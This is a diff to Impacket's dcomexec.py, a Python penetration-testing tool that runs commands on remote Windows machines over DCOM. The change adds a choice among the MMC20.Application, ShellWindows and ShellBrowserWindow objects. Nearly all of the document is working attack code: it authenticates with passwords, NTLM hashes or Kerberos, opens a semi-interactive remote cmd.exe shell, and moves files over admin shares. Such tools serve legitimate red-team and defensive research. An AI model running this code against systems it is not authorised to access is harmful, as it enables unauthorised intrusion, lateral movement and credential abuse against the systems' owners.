@@ -1,18 +1,22 @@
 #!/usr/bin/env python
-# Copyright (c) 2003-2016 CORE Security Technologies
+# Copyright (c) 2003-2018 CORE Security Technologies
 #
 # This software is provided under under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
 # for more information.
 #
-# A similar approach to wmiexec but executing commands through MMC.
-# Main advantage here is it runs under the user (has to be Admin)
-# account, not SYSTEM, plus, it doesn't generate noisy messages
-# in the event log that smbexec.py does when creating a service.
+# A similar approach to wmiexec but executing commands through DCOM.
+# You can select different objects to be used to execute the commands.
+# Currently supported objects are:
+#    1. MMC20.Application (49B2791A-B1AE-4C90-9B8E-E860BA07F889) - Tested Windows 7, Windows 10, Server 2012R2
+#    2. ShellWindows (9BA05972-F6A8-11CF-A442-00A0C90A8F39) - Tested Windows 7, Windows 10, Server 2012R2
+#    3. ShellBrowserWindow (C08AFD90-F2A1-11D1-8455-00A0C91F3880) - Tested Windows 10, Server 2012R2
+#
 # Drawback is it needs DCOM, hence, I have to be able to access
 # DCOM ports at the target machine.
 #
 # Original discovery by Matt Nelson (@enigma0x3):
+# https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
 # https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/
 #
 # Author:
@@ -49,9 +53,9 @@ from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002,
 
 OUTPUT_FILENAME = '__' + str(time.time())
 
-class SHELLBRWEXEC:
+class DCOMEXEC:
     def __init__(self, command='', username='', password='', domain='', hashes=None, aesKey=None, share=None,
-                 noOutput=False, doKerberos=False, kdcHost=None):
+                 noOutput=False, doKerberos=False, kdcHost=None, dcomObject=None):
         self.__command = command
         self.__username = username
         self.__password = password
@@ -63,6 +67,7 @@ class SHELLBRWEXEC:
         self.__noOutput = noOutput
         self.__doKerberos = doKerberos
         self.__kdcHost = kdcHost
+        self.__dcomObject = dcomObject
         self.shell = None
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
@@ -111,32 +116,56 @@ class SHELLBRWEXEC:
         dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                               self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
         try:
-            # ShellWindows CLSID (Windows 7, Windows 10, Windows Server 2012R2)
-            #iInterface = dcom.CoCreateInstanceEx(string_to_bin('9BA05972-F6A8-11CF-A442-00A0C90A8F39'), IID_IDispatch)
-
-            # ShellBrowserWindow CLSID (Windows 10, Windows Server 2012R2)
-            iInterface = dcom.CoCreateInstanceEx(string_to_bin('C08AFD90-F2A1-11D1-8455-00A0C91F3880'), IID_IDispatch)
-
-            iMMC = IDispatch(iInterface)
-            resp = iMMC.GetIDsOfNames(('Document',))
-
             dispParams = DISPPARAMS(None, False)
             dispParams['rgvarg'] = NULL
             dispParams['rgdispidNamedArgs'] = NULL
             dispParams['cArgs'] = 0
             dispParams['cNamedArgs'] = 0
-            resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
+
+            if self.__dcomObject == 'ShellWindows':
+                # ShellWindows CLSID (Windows 7, Windows 10, Windows Server 2012R2)
+                iInterface = dcom.CoCreateInstanceEx(string_to_bin('9BA05972-F6A8-11CF-A442-00A0C90A8F39'), IID_IDispatch)
+                iMMC = IDispatch(iInterface)
+                resp = iMMC.GetIDsOfNames(('Item',))
+                resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_METHOD, dispParams, 0, [], [])
+                iItem = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
+                resp = iItem.GetIDsOfNames(('Document',))
+                resp = iItem.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
+                pQuit = None
+            elif self.__dcomObject == 'ShellBrowserWindow':
+                # ShellBrowserWindow CLSID (Windows 10, Windows Server 2012R2)
+                iInterface = dcom.CoCreateInstanceEx(string_to_bin('C08AFD90-F2A1-11D1-8455-00A0C91F3880'), IID_IDispatch)
+                iMMC = IDispatch(iInterface)
+                resp = iMMC.GetIDsOfNames(('Document',))
+                resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
+                pQuit = iMMC.GetIDsOfNames(('Quit',))[0]
+            elif self.__dcomObject == 'MMC20':
+                iInterface = dcom.CoCreateInstanceEx(string_to_bin('49B2791A-B1AE-4C90-9B8E-E860BA07F889'), IID_IDispatch)
+                iMMC = IDispatch(iInterface)
+                resp = iMMC.GetIDsOfNames(('Document',))
+                resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
+                pQuit = iMMC.GetIDsOfNames(('Quit',))[0]
+            else:
+                logging.fatal('Invalid object %s' % self.__dcomObject)
+                return
 
             iDocument = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
-            resp = iDocument.GetIDsOfNames(('Application',))
-            resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
 
-            iActiveView = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
-            pExecuteShellCommand = iActiveView.GetIDsOfNames(('ShellExecute',))[0]
+            if self.__dcomObject == 'MMC20':
+                resp = iDocument.GetIDsOfNames(('ActiveView',))
+                resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
 
-            pQuit = iMMC.GetIDsOfNames(('Quit',))[0]
+                iActiveView = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
+                pExecuteShellCommand = iActiveView.GetIDsOfNames(('ExecuteShellCommand',))[0]
+                self.shell = RemoteShellMMC20(self.__share, (iMMC, pQuit), (iActiveView, pExecuteShellCommand), smbConnection)
+            else:
+                resp = iDocument.GetIDsOfNames(('Application',))
+                resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])
 
-            self.shell = RemoteShell(self.__share, (iMMC, pQuit), (iActiveView, pExecuteShellCommand), smbConnection)
+                iActiveView = IDispatch(self.getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
+                pExecuteShellCommand = iActiveView.GetIDsOfNames(('ShellExecute',))[0]
+                self.shell = RemoteShell(self.__share, (iMMC, pQuit), (iActiveView, pExecuteShellCommand), smbConnection)
+
             if self.__command != ' ':
                 self.shell.onecmd(self.__command)
                 if self.shell is not None:
@@ -144,8 +173,9 @@ class SHELLBRWEXEC:
             else:
                 self.shell.cmdloop()
         except  (Exception, KeyboardInterrupt), e:
-            import traceback
-            traceback.print_exc()
+            if logging.getLogger().level == logging.DEBUG:
+                import traceback
+                traceback.print_exc()
             if self.shell is not None:
                 self.shell.do_exit('')
             logging.error(str(e))
@@ -162,15 +192,15 @@ class SHELLBRWEXEC:
 class RemoteShell(cmd.Cmd):
     def __init__(self, share, quit, executeShellCommand, smbConnection):
         cmd.Cmd.__init__(self)
-        self.__share = share
-        self.__output = '\\' + OUTPUT_FILENAME
+        self._share = share
+        self._output = '\\' + OUTPUT_FILENAME
         self.__outputBuffer = ''
-        self.__shell = 'cmd.exe'
+        self._shell = 'cmd.exe'
         self.__quit = quit
-        self.__executeShellCommand = executeShellCommand
+        self._executeShellCommand = executeShellCommand
         self.__transferClient = smbConnection
-        self.__pwd = 'C:\\windows\\system32'
-        self.__noOutput = False
+        self._pwd = 'C:\\windows\\system32'
+        self._noOutput = False
         self.intro = '[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands'
 
         # We don't wanna deal with timeouts from now on.
@@ -178,7 +208,7 @@ class RemoteShell(cmd.Cmd):
             self.__transferClient.setTimeout(100000)
             self.do_cd('\\')
         else:
-            self.__noOutput = True
+            self._noOutput = True
 
     def do_shell(self, s):
         os.system(s)
@@ -204,7 +234,7 @@ class RemoteShell(cmd.Cmd):
     def do_get(self, src_path):
         try:
             import ntpath
-            newPath = ntpath.normpath(ntpath.join(self.__pwd, src_path))
+            newPath = ntpath.normpath(ntpath.join(self._pwd, src_path))
             drive, tail = ntpath.splitdrive(newPath)
             filename = ntpath.basename(tail)
             fh = open(filename,'wb')
@@ -230,7 +260,7 @@ class RemoteShell(cmd.Cmd):
             fh = open(src_path, 'rb')
             dst_path = string.replace(dst_path, '/','\\')
             import ntpath
-            pathname = ntpath.join(ntpath.join(self.__pwd,dst_path), src_file)
+            pathname = ntpath.join(ntpath.join(self._pwd, dst_path), src_file)
             drive, tail = ntpath.splitdrive(pathname)
             logging.info("Uploading %s to %s" % (src_file, pathname))
             self.__transferClient.putFile(drive[:-1]+'$', tail, fh.read)
@@ -259,10 +289,10 @@ class RemoteShell(cmd.Cmd):
             print self.__outputBuffer
             self.__outputBuffer = ''
         else:
-            self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
+            self._pwd = ntpath.normpath(ntpath.join(self._pwd, s))
             self.execute_remote('cd ')
-            self.__pwd = self.__outputBuffer.strip('\r\n')
-            self.prompt = self.__pwd + '>'
+            self._pwd = self.__outputBuffer.strip('\r\n')
+            self.prompt = self._pwd + '>'
             self.__outputBuffer = ''
 
     def default(self, line):
@@ -276,10 +306,10 @@ class RemoteShell(cmd.Cmd):
                 self.__outputBuffer = ''
             else:
                 # Drive valid, now we should get the current path
-                self.__pwd = line
+                self._pwd = line
                 self.execute_remote('cd ')
-                self.__pwd = self.__outputBuffer.strip('\r\n')
-                self.prompt = self.__pwd + '>'
+                self._pwd = self.__outputBuffer.strip('\r\n')
+                self.prompt = self._pwd + '>'
                 self.__outputBuffer = ''
         else:
             if line != '':
@@ -289,13 +319,13 @@ class RemoteShell(cmd.Cmd):
         def output_callback(data):
             self.__outputBuffer += data
 
-        if self.__noOutput is True:
+        if self._noOutput is True:
             self.__outputBuffer = ''
             return
 
         while True:
             try:
-                self.__transferClient.getFile(self.__share, self.__output, output_callback)
+                self.__transferClient.getFile(self._share, self._output, output_callback)
                 break
             except Exception, e:
                 if str(e).find('STATUS_SHARING_VIOLATION') >=0:
@@ -307,12 +337,12 @@ class RemoteShell(cmd.Cmd):
                     logging.debug('Connection broken, trying to recreate it')
                     self.__transferClient.reconnect()
                     return self.get_output()
-        self.__transferClient.deleteFile(self.__share, self.__output)
+        self.__transferClient.deleteFile(self._share, self._output)
 
     def execute_remote(self, data):
         command = '/Q /c ' + data
-        if self.__noOutput is False:
-            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output  + ' 2>&1'
+        if self._noOutput is False:
+            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self._share + self._output + ' 2>&1'
 
         dispParams = DISPPARAMS(None, False)
         dispParams['rgdispidNamedArgs'] = NULL
@@ -322,7 +352,7 @@ class RemoteShell(cmd.Cmd):
         arg0['clSize'] = 5
         arg0['vt'] = VARENUM.VT_BSTR
         arg0['_varUnion']['tag'] = VARENUM.VT_BSTR
-        arg0['_varUnion']['bstrVal']['asData'] = self.__shell
+        arg0['_varUnion']['bstrVal']['asData'] = self._shell
 
         arg1 = VARIANT(None, False)
         arg1['clSize'] = 5
@@ -334,7 +364,7 @@ class RemoteShell(cmd.Cmd):
         arg2['clSize'] = 5
         arg2['vt'] = VARENUM.VT_BSTR
         arg2['_varUnion']['tag'] = VARENUM.VT_BSTR
-        arg2['_varUnion']['bstrVal']['asData'] = self.__pwd
+        arg2['_varUnion']['bstrVal']['asData'] = self._pwd
 
         arg3 = VARIANT(None, False)
         arg3['clSize'] = 5
@@ -353,16 +383,58 @@ class RemoteShell(cmd.Cmd):
         dispParams['rgvarg'].append(arg1)
         dispParams['rgvarg'].append(arg0)
 
-        print dispParams.dump()
+        #print dispParams.dump()
 
-        self.__executeShellCommand[0].Invoke(self.__executeShellCommand[1], 0x409, DISPATCH_METHOD, dispParams,
-                                             0, [], [])
+        self._executeShellCommand[0].Invoke(self._executeShellCommand[1], 0x409, DISPATCH_METHOD, dispParams,
+                                            0, [], [])
         self.get_output()
 
     def send_data(self, data):
         self.execute_remote(data)
         print self.__outputBuffer
         self.__outputBuffer = ''
+
+class RemoteShellMMC20(RemoteShell):
+    def execute_remote(self, data):
+        command = '/Q /c ' + data
+        if self._noOutput is False:
+            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self._share + self._output  + ' 2>&1'
+
+        dispParams = DISPPARAMS(None, False)
+        dispParams['rgdispidNamedArgs'] = NULL
+        dispParams['cArgs'] = 4
+        dispParams['cNamedArgs'] = 0
+        arg0 = VARIANT(None, False)
+        arg0['clSize'] = 5
+        arg0['vt'] = VARENUM.VT_BSTR
+        arg0['_varUnion']['tag'] = VARENUM.VT_BSTR
+        arg0['_varUnion']['bstrVal']['asData'] = self._shell
+
+        arg1 = VARIANT(None, False)
+        arg1['clSize'] = 5
+        arg1['vt'] = VARENUM.VT_BSTR
+        arg1['_varUnion']['tag'] = VARENUM.VT_BSTR
+        arg1['_varUnion']['bstrVal']['asData'] = self._pwd
+
+        arg2 = VARIANT(None, False)
+        arg2['clSize'] = 5
+        arg2['vt'] = VARENUM.VT_BSTR
+        arg2['_varUnion']['tag'] = VARENUM.VT_BSTR
+        arg2['_varUnion']['bstrVal']['asData'] = command.decode(sys.stdin.encoding)
+
+        arg3 = VARIANT(None, False)
+        arg3['clSize'] = 5
+        arg3['vt'] = VARENUM.VT_BSTR
+        arg3['_varUnion']['tag'] = VARENUM.VT_BSTR
+        arg3['_varUnion']['bstrVal']['asData'] = '7'
+        dispParams['rgvarg'].append(arg3)
+        dispParams['rgvarg'].append(arg2)
+        dispParams['rgvarg'].append(arg1)
+        dispParams['rgvarg'].append(arg0)
+
+        self._executeShellCommand[0].Invoke(self._executeShellCommand[1], 0x409, DISPATCH_METHOD, dispParams,
+                                            0, [], [])
+        self.get_output()
 
 class AuthFileSyntaxError(Exception):
 
@@ -427,6 +499,8 @@ if __name__ == '__main__':
     parser.add_argument('-nooutput', action='store_true', default = False, help='whether or not to print the output '
                                                                                 '(no SMB connection created)')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
+    parser.add_argument('-object', choices=['ShellWindows', 'ShellBrowserWindow', 'MMC20'], nargs='?', default='ShellWindows',
+                        help='DCOM object to be used to execute the shell command (default=ShellWindows)')
 
     parser.add_argument('command', nargs='*', default = ' ', help='command to execute at the target. If empty it will '
                                                                   'launch a semi-interactive shell')
@@ -485,11 +559,12 @@ if __name__ == '__main__':
         if options.aesKey is not None:
             options.k = True
 
-        executer = SHELLBRWEXEC(' '.join(options.command), username, password, domain, options.hashes, options.aesKey,
-                           options.share, options.nooutput, options.k, options.dc_ip)
+        executer = DCOMEXEC(' '.join(options.command), username, password, domain, options.hashes, options.aesKey,
+                            options.share, options.nooutput, options.k, options.dc_ip, options.object)
         executer.run(address)
     except (Exception, KeyboardInterrupt), e:
-        import traceback
-        print traceback.print_exc()
+        if logging.getLogger().level == logging.DEBUG:
+            import traceback
+            print traceback.print_exc()
         logging.error(str(e))
     sys.exit(0)
